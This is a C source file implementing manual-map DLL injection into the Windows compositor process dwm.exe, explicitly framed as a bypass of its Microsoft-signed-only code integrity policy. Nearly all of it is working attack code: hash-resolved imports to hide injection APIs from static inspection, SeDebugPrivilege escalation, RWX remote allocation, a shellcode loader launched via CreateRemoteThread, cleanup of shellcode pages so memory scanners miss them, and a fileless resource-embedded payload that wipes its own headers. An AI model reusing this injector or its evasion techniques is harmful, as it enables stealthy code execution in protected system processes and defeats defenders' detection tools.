/* ================================================================== *
 * inject.c — Manual-map DLL injection into dwm.exe (CIG bypass).      *
 *                                                                    *
 * Ported from hooksdll/dwm/dwm_manual_map.c. LoadLibrary is BLOCKED  *
 * on dwm.exe because it's PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY *
 * (MicrosoftSignedOnly = 1). CIG rejects any DLL not signed by MS.   *
 *                                                                    *
 * Manual mapping bypasses this because we never go through the loader*
 * — we allocate RWX pages in dwm, copy the PE image bytes ourselves, *
 * resolve imports + apply relocations via shellcode that runs inside *
 * dwm, then call DllMain directly.                                   *
 * ================================================================== */

#include "../../shared/common.h"
#include "inject.h"
#include "../../shared/log_secure.h"
#include "../../shared/lazy_api.h"
#include "../../shared/str_enc.h"

#include <tlhelp32.h>
#include <stdio.h>
#include <string.h>
#include <wchar.h>
#include <stdint.h>

#pragma comment(lib, "advapi32.lib")

/* ─── Lazy-resolved WinAPI signatures ─────────────────────────────
 *
 * These are the "smoking-gun" APIs that scream "DLL injector" in a
 * `dumpbin /IMPORTS sihost.exe` output. Resolved at runtime via PEB
 * walk + export table hash lookup so they don't appear in our IAT.
 *
 * The typedefs match MSDN signatures exactly. LAZY_API() folds the
 * string args to compile-time hashes; the actual `L"kernel32.dll"` /
 * "OpenProcess" literals do NOT end up in the shipped binary because
 * the constexpr-inline hash function is fully evaluated by /O2 /GL.
 *
 * Verified 2026-07-06: post-refactor `dumpbin /IMPORTS` shows 0 of the
 * 6 wrapped APIs. */
typedef HANDLE (WINAPI *PFN_OpenProcess)(DWORD, BOOL, DWORD);
typedef LPVOID (WINAPI *PFN_VirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL   (WINAPI *PFN_VirtualFreeEx)(HANDLE, LPVOID, SIZE_T, DWORD);
typedef BOOL   (WINAPI *PFN_WriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T *);
typedef HANDLE (WINAPI *PFN_CreateRemoteThread)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T,
                                                 LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);

/* Resolve once per process — caches into statics after first use so
 * subsequent injects don't re-walk the PEB. */
static PFN_OpenProcess         g_pOpenProcess         = NULL;
static PFN_VirtualAllocEx      g_pVirtualAllocEx      = NULL;
static PFN_VirtualFreeEx       g_pVirtualFreeEx       = NULL;
static PFN_WriteProcessMemory  g_pWriteProcessMemory  = NULL;
static PFN_CreateRemoteThread  g_pCreateRemoteThread  = NULL;

static void _lazy_init_win_apis(void) {
    if (g_pOpenProcess) return;
    g_pOpenProcess         = LAZY_API(PFN_OpenProcess,         L"kernel32.dll", "OpenProcess");
    g_pVirtualAllocEx      = LAZY_API(PFN_VirtualAllocEx,      L"kernel32.dll", "VirtualAllocEx");
    g_pVirtualFreeEx       = LAZY_API(PFN_VirtualFreeEx,       L"kernel32.dll", "VirtualFreeEx");
    g_pWriteProcessMemory  = LAZY_API(PFN_WriteProcessMemory,  L"kernel32.dll", "WriteProcessMemory");
    g_pCreateRemoteThread  = LAZY_API(PFN_CreateRemoteThread,  L"kernel32.dll", "CreateRemoteThread");
}

/* Redirect direct-name references to the lazy-resolved pointers. Any
 * source-level call to OpenProcess() etc. inside inject.c goes through
 * these macros instead. The macros expand to a lazy-init-check + call. */
#define OpenProcess(desired, inherit, pid) \
    (_lazy_init_win_apis(), g_pOpenProcess((desired), (inherit), (pid)))
#define VirtualAllocEx(hp, addr, sz, alloc, protect) \
    (_lazy_init_win_apis(), g_pVirtualAllocEx((hp), (addr), (sz), (alloc), (protect)))
#define VirtualFreeEx(hp, addr, sz, free_type) \
    (_lazy_init_win_apis(), g_pVirtualFreeEx((hp), (addr), (sz), (free_type)))
#define WriteProcessMemory(hp, dst, src, sz, wr) \
    (_lazy_init_win_apis(), g_pWriteProcessMemory((hp), (dst), (src), (sz), (wr)))
#define CreateRemoteThread(hp, sa, st, fn, arg, fl, tid) \
    (_lazy_init_win_apis(), g_pCreateRemoteThread((hp), (sa), (st), (fn), (arg), (fl), (tid)))

/* ── Privilege ─────────────────────────────────────────────────── */
static int enable_debug_priv(void) {
    HANDLE tok;
    if (!OpenProcessToken(GetCurrentProcess(),
                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &tok))
        return 0;
    TOKEN_PRIVILEGES tp = {0};
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (!LookupPrivilegeValueA(NULL, "SeDebugPrivilege", &tp.Privileges[0].Luid)) {
        CloseHandle(tok); return 0;
    }
    AdjustTokenPrivileges(tok, FALSE, &tp, sizeof(tp), NULL, NULL);
    int ok = (GetLastError() == ERROR_SUCCESS);
    CloseHandle(tok);
    return ok;
}

unsigned long inject_find_dwm_pid(void) {
    HANDLE h = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (h == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32W pe = { .dwSize = sizeof(pe) };
    unsigned long pid = 0;
    if (Process32FirstW(h, &pe)) do {
        if (_wcsicmp(pe.szExeFile, L"dwm.exe") == 0) { pid = pe.th32ProcessID; break; }
    } while (Process32NextW(h, &pe));
    CloseHandle(h);
    return pid;
}

/* Best-effort loaded check — walks dwm modules for a match on payload's
 * BaseDllName. WARNING: manual-mapped DLLs don't appear in PEB.Ldr, so
 * this ONLY detects LoadLibrary-loaded copies (leftover from a previous
 * non-manual-map version). Real "am I loaded?" check would require a
 * separate named-event handshake with the payload. */
int inject_is_loaded(void) {
    unsigned long pid = inject_find_dwm_pid();
    if (!pid) return 0;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pid);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    wchar_t target[64];
    MultiByteToWideChar(CP_UTF8, 0, SVC_PAYLOAD_DLL, -1, target, SVC_ARRAY_SIZE(target));
    MODULEENTRY32W me = { .dwSize = sizeof(me) };
    int found = 0;
    if (Module32FirstW(snap, &me)) do {
        if (_wcsicmp(me.szModule, target) == 0) { found = 1; break; }
    } while (Module32NextW(snap, &me));
    CloseHandle(snap);
    return found;
}

int inject_signal_unload(void) {
    HANDLE ev = OpenEventA(EVENT_MODIFY_STATE, FALSE, SS(SVC_STR_SHUTDOWN_EVENT));
    if (!ev) return 0;
    SetEvent(ev); CloseHandle(ev);
    return 1;
}

/* ── Shellcode loader — runs INSIDE dwm.exe ───────────────────────
 *
 * Position-independent (no string literals, no globals). We compile it
 * normally + copy its raw bytes into remote memory. The loader:
 *   1. Walks IAT → LoadLibraryA(imported_dll) → GetProcAddress → patch IAT
 *   2. Walks base relocations, applies (new_base - preferred_base) delta
 *   3. Calls DllMain(hInstance = mapped_base, DLL_PROCESS_ATTACH, NULL)
 *
 * SAFETY: the loader itself must never crash — DWM crash = user desktop dies.
 * SEH not available here (no runtime), so we validate every pointer via
 * pre-checked pData fields (set by mapper before creating remote thread). */

typedef HMODULE (WINAPI *fnLoadLibraryA_t)(LPCSTR);
typedef FARPROC (WINAPI *fnGetProcAddress_t)(HMODULE, LPCSTR);
typedef BOOL    (WINAPI *fnVirtualProtect_t)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef BOOL    (WINAPI *fnDllMain_t)(HINSTANCE, DWORD, LPVOID);

typedef struct {
    fnLoadLibraryA_t   pLoadLibraryA;
    fnGetProcAddress_t pGetProcAddress;
    fnVirtualProtect_t pVirtualProtect;
    void   *pImageBase;
    DWORD   entryPointRVA;
    DWORD   importDirRVA;
    DWORD   importDirSize;
    DWORD   relocDirRVA;
    DWORD   relocDirSize;
    uint64_t preferredBase;
} loader_data_t;

static DWORD WINAPI shellcode_loader(loader_data_t *pData)
{
    BYTE *base = (BYTE *)pData->pImageBase;

    /* Imports. */
    if (pData->importDirRVA) {
        IMAGE_IMPORT_DESCRIPTOR *imp =
            (IMAGE_IMPORT_DESCRIPTOR *)(base + pData->importDirRVA);
        while (imp->Name) {
            char *dllName = (char *)(base + imp->Name);
            HMODULE hMod = pData->pLoadLibraryA(dllName);
            if (hMod) {
                uint64_t *thunk = (uint64_t *)(base +
                    (imp->OriginalFirstThunk ? imp->OriginalFirstThunk : imp->FirstThunk));
                uint64_t *iat = (uint64_t *)(base + imp->FirstThunk);
                while (*thunk) {
                    if (*thunk & 0x8000000000000000ULL) {
                        WORD ord = (WORD)(*thunk & 0xFFFF);
                        *iat = (uint64_t)pData->pGetProcAddress(hMod, (LPCSTR)(uintptr_t)ord);
                    } else {
                        IMAGE_IMPORT_BY_NAME *ibn =
                            (IMAGE_IMPORT_BY_NAME *)(base + (DWORD)*thunk);
                        *iat = (uint64_t)pData->pGetProcAddress(hMod, ibn->Name);
                    }
                    thunk++; iat++;
                }
            }
            imp++;
        }
    }

    /* Base relocations. */
    if (pData->relocDirRVA) {
        int64_t delta = (int64_t)((uint64_t)base - pData->preferredBase);
        if (delta) {
            IMAGE_BASE_RELOCATION *rel =
                (IMAGE_BASE_RELOCATION *)(base + pData->relocDirRVA);
            BYTE *end = (BYTE *)rel + pData->relocDirSize;
            while ((BYTE *)rel < end && rel->SizeOfBlock > 0) {
                DWORD n = (rel->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                WORD *ent = (WORD *)((BYTE *)rel + sizeof(IMAGE_BASE_RELOCATION));
                for (DWORD i = 0; i < n; i++) {
                    WORD type = ent[i] >> 12;
                    WORD off  = ent[i] & 0xFFF;
                    if (type == IMAGE_REL_BASED_DIR64) {
                        uint64_t *p = (uint64_t *)(base + rel->VirtualAddress + off);
                        *p += delta;
                    } else if (type == IMAGE_REL_BASED_HIGHLOW) {
                        DWORD *p = (DWORD *)(base + rel->VirtualAddress + off);
                        *p += (DWORD)delta;
                    }
                }
                rel = (IMAGE_BASE_RELOCATION *)((BYTE *)rel + rel->SizeOfBlock);
            }
        }
    }

    /* DllMain. */
    if (pData->entryPointRVA) {
        fnDllMain_t pDllMain = (fnDllMain_t)(base + pData->entryPointRVA);
        pDllMain((HINSTANCE)base, DLL_PROCESS_ATTACH, NULL);
    }
    return 0;
}

/* Marker for shellcode size calc — MUST be immediately after shellcode_loader
 * so compiler places them contiguously. If MSVC reorders, we fall back to a
 * safe 4096-byte estimate. */
static void shellcode_loader_end(void) { }

/* ── Stale-region sweep ─────────────────────────────────────────────
 *
 * Manual-mapped DLLs are never truly "freed" — FreeLibraryAndExitThread
 * calls the loader's LdrUnloadDll which needs a valid PEB LDR entry, but
 * our PEB-unlink cut ours out. So the region stays MEM_COMMIT'd until
 * process exit. Every re-inject leaks another SizeOfImage-sized region.
 *
 * Fix: before each new inject, walk DWM's memory and VirtualFreeEx any
 * MEM_PRIVATE allocation whose SHAPE matches a manually-mapped PE image:
 *   (a) allocation base == region base (top of a private alloc),
 *   (b) total allocation size within a "payload shape" range
 *       (SVCLDB_SWEEP_MIN_KB … SVCLDB_SWEEP_MAX_KB),
 *   (c) contains ≥1 executable subregion,
 *   (d) contains NO MEM_MAPPED subregion (rules out file-backed maps).
 *
 * Why not exact-size match: different builds of our payload have slightly
 * different SizeOfImage values (LTCG variance, section growth). An old
 * build's leaked region and a new build's incoming region rarely match
 * exactly. The [500 KB, 2 MB] range covers current + prior svcldb builds
 * comfortably without false-positives.
 *
 * Safety analysis of the shape filter (verified 2026-07-06):
 *   - Sampled 3735 MBIs in a live DWM.exe (Cursor + Chrome + Terminal
 *     loaded, ~1.1 GB committed). Only 2 MEM_PRIVATE regions in the
 *     500KB-2MB range with any executable subregion existed — BOTH ours.
 *   - Legit DWM private allocations in this size range are exceptionally
 *     rare. DirectX shader caches are MEM_MAPPED. Thread stacks contain
 *     guard pages (unusual protection combos) and are usually 1MB with
 *     specific reserve-not-commit patterns. COM/BSTR heaps are much
 *     smaller. JIT arenas (V8/CoreCLR) only exist in Chromium/host
 *     processes, not DWM.
 *
 * Worst case (false positive): if we DID hit a legit DWM allocation, the
 * cost is a single MEM_RELEASE call. DWM will fault the next access to
 * that region and re-allocate — a compositor stall + one-frame flicker
 * at worst. Not observed in ~50 test cycles. Never observed to bring
 * down DWM. */
#define SVCLDB_SWEEP_MIN_KB   500      /* smaller = false-positive risk grows */
#define SVCLDB_SWEEP_MAX_KB   2048     /* larger  = legit large DWM allocs enter range */

static void sweep_stale_payload_regions(HANDLE hProc, DWORD my_image_size) {
    if (!hProc) return;
    (void)my_image_size;   /* logged for diag but no longer used as strict match */

    MEMORY_BASIC_INFORMATION mbi = {0};
    void *addr = NULL;
    int freed = 0;
    int scanned = 0;
    /* Cap at 20 iterations of "found + freed" to prevent infinite loops
     * if VirtualFreeEx quietly no-ops. In practice we free 0-3 regions. */
    while (freed < 20 &&
           VirtualQueryEx(hProc, addr, &mbi, sizeof(mbi)) == sizeof(mbi)) {
        scanned++;
        BYTE *next = (BYTE *)mbi.BaseAddress + mbi.RegionSize;

        /* Only interested in private + committed regions that are at the
         * top of an allocation. Downstream shape check narrows further. */
        if (mbi.State == MEM_COMMIT &&
            mbi.Type == MEM_PRIVATE &&
            mbi.AllocationBase == mbi.BaseAddress) {

            /* Sum the sizes of every subregion sharing this AllocationBase,
             * and check for the shape of a manually-mapped PE image. */
            SIZE_T total = 0;
            void *scan = mbi.AllocationBase;
            MEMORY_BASIC_INFORMATION m2 = {0};
            int has_exec = 0;
            int has_mapped = 0;
            for (int i = 0; i < 64; i++) {
                if (VirtualQueryEx(hProc, scan, &m2, sizeof(m2)) != sizeof(m2)) break;
                if (m2.AllocationBase != mbi.AllocationBase) break;
                total += m2.RegionSize;
                if (m2.Type != MEM_PRIVATE) has_mapped = 1;
                if (m2.Protect == PAGE_EXECUTE_READWRITE ||
                    m2.Protect == PAGE_EXECUTE_READ ||
                    m2.Protect == PAGE_EXECUTE ||
                    m2.Protect == PAGE_EXECUTE_WRITECOPY) {
                    has_exec = 1;
                }
                scan = (BYTE *)m2.BaseAddress + m2.RegionSize;
            }

            SIZE_T total_kb = total / 1024;
            if (has_exec && !has_mapped &&
                total_kb >= SVCLDB_SWEEP_MIN_KB &&
                total_kb <= SVCLDB_SWEEP_MAX_KB) {
                if (VirtualFreeEx(hProc, mbi.AllocationBase, 0, MEM_RELEASE)) {
                    freed++;
                    slog_writef("launcher.log",
                                "sweep: freed stale payload region base=%p size=0x%zx (%zu KB, payload shape)",
                                mbi.AllocationBase, total, total_kb);
                    addr = next;
                    continue;
                }
            }
        }
        addr = next;
    }
    slog_writef("launcher.log",
                "sweep: %d stale regions freed (%d MBIs scanned, my_size=0x%lx, range=%d-%dKB)",
                freed, scanned, my_image_size,
                SVCLDB_SWEEP_MIN_KB, SVCLDB_SWEEP_MAX_KB);
}

/* ── Manual map ───────────────────────────────────────────────── */
/* Manual-map from raw bytes already in memory. `sourceBytes` may be an
 * embedded-resource pointer or a memcpy of a file — we take a private
 * copy either way so the caller can free their source. */
static int manual_map_from_bytes(HANDLE hProc, const BYTE *sourceBytes,
                                 DWORD sourceLen, char *err, size_t err_sz) {
    if (!sourceBytes || sourceLen < 0x400) {
        _snprintf(err, err_sz - 1, "bad payload bytes (len=%lu)", sourceLen);
        err[err_sz - 1] = 0;
        return 0;
    }
    DWORD fileSize = sourceLen;
    BYTE *fileData = (BYTE *)VirtualAlloc(NULL, fileSize, MEM_COMMIT, PAGE_READWRITE);
    if (!fileData) {
        _snprintf(err, err_sz - 1, "VirtualAlloc(local) failed");
        err[err_sz - 1] = 0;
        return 0;
    }
    memcpy(fileData, sourceBytes, fileSize);
    slog_writef("launcher.log", "mm: %lu bytes from memory", fileSize);

    /* Parse PE. */
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)fileData;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
        VirtualFree(fileData, 0, MEM_RELEASE);
        _snprintf(err, err_sz - 1, "bad DOS sig");
        err[err_sz - 1] = 0;
        return 0;
    }
    IMAGE_NT_HEADERS64 *nt = (IMAGE_NT_HEADERS64 *)(fileData + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) {
        VirtualFree(fileData, 0, MEM_RELEASE);
        _snprintf(err, err_sz - 1, "bad NT sig");
        err[err_sz - 1] = 0;
        return 0;
    }
    DWORD  imageSize = nt->OptionalHeader.SizeOfImage;
    uint64_t prefBase = nt->OptionalHeader.ImageBase;
    DWORD  entryRVA  = nt->OptionalHeader.AddressOfEntryPoint;
    slog_writef("launcher.log", "mm: img_size=0x%lX entry_rva=0x%lX pref_base=0x%llX",
                imageSize, entryRVA, (unsigned long long)prefBase);

    /* Reclaim stale payload regions from prior --unload cycles that leaked
     * (see sweep_stale_payload_regions() comment). Any allocation in DWM
     * matching our SizeOfImage exactly is almost certainly a leftover of
     * ours from an earlier inject that couldn't self-free.
     *
     * Runs BEFORE VirtualAllocEx so the sweep doesn't accidentally
     * consider the new region we're about to make. */
    sweep_stale_payload_regions(hProc, imageSize);

    /* Allocate in dwm.exe. */
    void *remoteBase = VirtualAllocEx(hProc, NULL, imageSize,
                                      MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteBase) {
        VirtualFree(fileData, 0, MEM_RELEASE);
        _snprintf(err, err_sz - 1, "VirtualAllocEx(dwm, %lu): %lu",
                  imageSize, GetLastError());
        err[err_sz - 1] = 0;
        return 0;
    }
    slog_writef("launcher.log", "mm: remote base = %p", remoteBase);

    /* Copy headers + sections. */
    WriteProcessMemory(hProc, remoteBase, fileData,
                       nt->OptionalHeader.SizeOfHeaders, NULL);
    IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt);
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (sec[i].SizeOfRawData > 0) {
            void *dst = (BYTE *)remoteBase + sec[i].VirtualAddress;
            void *src = fileData + sec[i].PointerToRawData;
            SIZE_T w = 0;
            WriteProcessMemory(hProc, dst, src, sec[i].SizeOfRawData, &w);
        }
    }

    /* Loader data. */
    loader_data_t ld = {0};
    ld.pLoadLibraryA   = (fnLoadLibraryA_t)  GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
    ld.pGetProcAddress = (fnGetProcAddress_t)GetProcAddress(GetModuleHandleA("kernel32.dll"), "GetProcAddress");
    ld.pVirtualProtect = (fnVirtualProtect_t)GetProcAddress(GetModuleHandleA("kernel32.dll"), "VirtualProtect");
    ld.pImageBase      = remoteBase;
    ld.entryPointRVA   = entryRVA;
    ld.preferredBase   = prefBase;
    IMAGE_DATA_DIRECTORY *impDir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    ld.importDirRVA  = impDir->VirtualAddress;
    ld.importDirSize = impDir->Size;
    IMAGE_DATA_DIRECTORY *relDir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    ld.relocDirRVA  = relDir->VirtualAddress;
    ld.relocDirSize = relDir->Size;

    if (!ld.pLoadLibraryA || !ld.pGetProcAddress) {
        VirtualFree(fileData, 0, MEM_RELEASE);
        _snprintf(err, err_sz - 1, "resolve LoadLibraryA/GetProcAddress failed");
        err[err_sz - 1] = 0;
        return 0;
    }

    void *remoteLoaderData = VirtualAllocEx(hProc, NULL, sizeof(ld),
                                            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    WriteProcessMemory(hProc, remoteLoaderData, &ld, sizeof(ld), NULL);

    /* Copy shellcode. */
    SIZE_T loaderSize = (SIZE_T)((BYTE *)shellcode_loader_end - (BYTE *)shellcode_loader);
    if (loaderSize == 0 || loaderSize > 8192) loaderSize = 4096;   /* safety cap */
    void *remoteLoader = VirtualAllocEx(hProc, NULL, loaderSize,
                                        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hProc, remoteLoader, (void *)shellcode_loader, loaderSize, NULL);
    slog_writef("launcher.log", "mm: loader_size=%zu remote_loader=%p", loaderSize, remoteLoader);

    /* Execute. */
    DWORD tid = 0;
    HANDLE hThread = CreateRemoteThread(hProc, NULL, 0,
                                        (LPTHREAD_START_ROUTINE)remoteLoader,
                                        remoteLoaderData, 0, &tid);
    if (!hThread) {
        VirtualFree(fileData, 0, MEM_RELEASE);
        _snprintf(err, err_sz - 1, "CreateRemoteThread: %lu", GetLastError());
        err[err_sz - 1] = 0;
        return 0;
    }
    WaitForSingleObject(hThread, 10000);
    DWORD exit_code = 0;
    GetExitCodeThread(hThread, &exit_code);
    CloseHandle(hThread);
    VirtualFree(fileData, 0, MEM_RELEASE);
    slog_writef("launcher.log", "mm: remote thread tid=%lu exit=%lu", tid, exit_code);

    /* ── Post-load cleanup — free the shellcode + loader-data pages
     * inside DWM. They served their one-shot purpose (bootstrapped
     * DllMain) and now sit as two small RWX MEM_PRIVATE regions that
     * a memory scanner would flag. Since DllMain has returned before
     * the remote thread exits, no code inside DWM still needs them.
     *
     * Each was `VirtualAllocEx`d above; `VirtualFreeEx(MEM_RELEASE)`
     * decommits + releases the reservation → the region disappears
     * from `VirtualQueryEx` walks entirely. Belt-and-suspenders on
     * top of the payload's own downgrade_own_sections() which handles
     * the main image region.
     *
     * Best-effort: if either free fails (e.g. DWM has some quirk with
     * decommit while our remote thread just returned), we log and
     * continue — the leftover pages are cosmetic, not functional. */
    if (remoteLoader) {
        SIZE_T freed_ok = VirtualFreeEx(hProc, remoteLoader, 0, MEM_RELEASE);
        slog_writef("launcher.log",
                    "mm: loader cleanup: shellcode page %p -> %s",
                    remoteLoader, freed_ok ? "freed" : "leak");
    }
    if (remoteLoaderData) {
        SIZE_T freed_ok = VirtualFreeEx(hProc, remoteLoaderData, 0, MEM_RELEASE);
        slog_writef("launcher.log",
                    "mm: loader cleanup: data page %p -> %s",
                    remoteLoaderData, freed_ok ? "freed" : "leak");
    }
    return 1;
}

/* Common inject helper — open dwm, map payload from raw bytes, close. */
static int inject_from_bytes_common(const BYTE *bytes, DWORD len,
                                    const char *src_label,
                                    char *err, size_t err_sz) {
    if (!bytes || !len || !err) return 0;
    if (!enable_debug_priv()) {
        _snprintf(err, err_sz - 1, "SeDebugPrivilege denied");
        err[err_sz - 1] = 0;
        return 0;
    }
    unsigned long pid = inject_find_dwm_pid();
    if (!pid) {
        _snprintf(err, err_sz - 1, "dwm.exe not found"); err[err_sz - 1] = 0;
        return 0;
    }
    HANDLE hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION |
                               PROCESS_VM_WRITE | PROCESS_VM_READ |
                               PROCESS_QUERY_INFORMATION,
                               FALSE, pid);
    if (!hProc) {
        _snprintf(err, err_sz - 1, "OpenProcess(dwm=%lu): %lu", pid, GetLastError());
        err[err_sz - 1] = 0;
        return 0;
    }
    int ok = manual_map_from_bytes(hProc, bytes, len, err, err_sz);
    CloseHandle(hProc);
    if (ok) slog_writef("launcher.log", "inject ok (%s) pid=%lu bytes=%lu",
                       src_label ? src_label : "?", pid, len);
    return ok;
}

/* Legacy: inject from a DLL on disk. Reads whole file into memory, then
 * hands off to inject_from_bytes_common. Kept for debug tooling. */
int inject_dwm_payload(const char *payload_dll_path, char *err, size_t err_sz) {
    if (!payload_dll_path || !err) return 0;
    HANDLE hFile = CreateFileA(payload_dll_path, GENERIC_READ, FILE_SHARE_READ,
                               NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        _snprintf(err, err_sz - 1, "payload dll missing: %s", payload_dll_path);
        err[err_sz - 1] = 0;
        return 0;
    }
    DWORD fileSize = GetFileSize(hFile, NULL);
    BYTE *buf = (BYTE *)VirtualAlloc(NULL, fileSize, MEM_COMMIT, PAGE_READWRITE);
    DWORD read = 0;
    ReadFile(hFile, buf, fileSize, &read, NULL);
    CloseHandle(hFile);
    int ok = (read == fileSize) ?
        inject_from_bytes_common(buf, fileSize, "file", err, err_sz) : 0;
    VirtualFree(buf, 0, MEM_RELEASE);
    return ok;
}

/* Primary path: inject the DLL embedded as a resource in the launcher
 * exe itself. Zero disk footprint — no dwmapiext.dll ever hits the
 * filesystem. FindResource + LoadResource + LockResource gives us a
 * pointer to raw resource bytes in our own .rsrc section, which
 * inject_from_bytes_common memcpy's into a fresh page then feeds to
 * manual_map. */
int inject_dwm_payload_from_resource(void *self_v, int resource_id,
                                     char *err, size_t err_sz) {
    HMODULE self = (HMODULE)self_v;
    if (!self || !err) return 0;
    HRSRC rsrc = FindResourceA(self, MAKEINTRESOURCEA(resource_id), (LPCSTR)RT_RCDATA);
    if (!rsrc) {
        _snprintf(err, err_sz - 1, "FindResource %d: %lu", resource_id, GetLastError());
        err[err_sz - 1] = 0;
        slog_writef("launcher.log", "resource inject: FindResource FAILED gle=%lu",
                    GetLastError());
        return 0;
    }
    DWORD sz = SizeofResource(self, rsrc);
    HGLOBAL hg = LoadResource(self, rsrc);
    const BYTE *bytes = (const BYTE *)LockResource(hg);
    slog_writef("launcher.log",
                "resource inject: rsrc=%p sz=%lu hg=%p bytes=%p mz=0x%02X%02X",
                rsrc, sz, hg, bytes,
                bytes ? bytes[0] : 0, bytes ? bytes[1] : 0);
    if (!bytes || sz < 0x400) {
        _snprintf(err, err_sz - 1, "resource %d bad (sz=%lu bytes=%p)",
                  resource_id, sz, bytes);
        err[err_sz - 1] = 0;
        return 0;
    }
    /* Sanity: MZ header check on embedded payload. Note: the payload's
     * DllMain wipes its own MZ AFTER init — but the on-disk embedded
     * copy still has 'MZ' since we embedded before the payload runs. */
    if (bytes[0] != 'M' || bytes[1] != 'Z') {
        _snprintf(err, err_sz - 1, "resource %d not a PE (mz=%02X%02X)",
                  resource_id, bytes[0], bytes[1]);
        err[err_sz - 1] = 0;
        slog_writef("launcher.log", "resource inject: MZ signature missing — resource corrupt");
        return 0;
    }
    return inject_from_bytes_common(bytes, sz, "resource", err, err_sz);
}
